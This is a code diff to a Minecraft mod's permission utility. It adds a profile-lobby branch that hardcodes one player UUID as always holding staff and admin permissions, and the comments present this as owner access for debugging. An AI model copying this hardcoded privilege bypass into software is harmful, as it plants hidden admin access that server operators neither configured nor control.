@@ -1,6 +1,7 @@
 package com.champutils.permissions;
 
 import com.champutils.badge.BadgeUnlockManager;
+import com.champutils.network.NetworkServerConfig;
 
 import net.minecraft.commands.CommandSourceStack;
 import net.minecraft.server.level.ServerPlayer;
@@ -26,6 +27,20 @@ public final class PermissionUtil {
 
         ServerPlayer player = source.getPlayer();
         if (player == null) return false;
+
+        // The profile lobby must be able to run without LuckPerms installed.
+        // During login Minecraft asks Brigadier which commands the player can use.
+        // If this method touches LuckPermsHook while LuckPerms is absent, classloading
+        // crashes the server before the player can finish joining.
+        if (NetworkServerConfig.serverRole() == NetworkServerConfig.ServerRole.PROFILE_LOBBY) {
+            // Let the known owner UUID manage the lightweight profile lobby without requiring LuckPerms.
+            // OP still works through source.hasPermission(4) above, but this also supports setup commands
+            // if the player is temporarily de-opped while debugging Velocity command-tree issues.
+            if (player.getUUID().toString().equalsIgnoreCase("d3012576-dc9f-41f4-baac-e926f3e053c2")) {
+                return permission.equals("champutils.staff") || permission.equals("champutils.admin");
+            }
+            return false;
+        }
 
         // champutils.admin should imply all ChampUtils staff/admin commands even if
         // LuckPerms group inheritance is not configured yet.
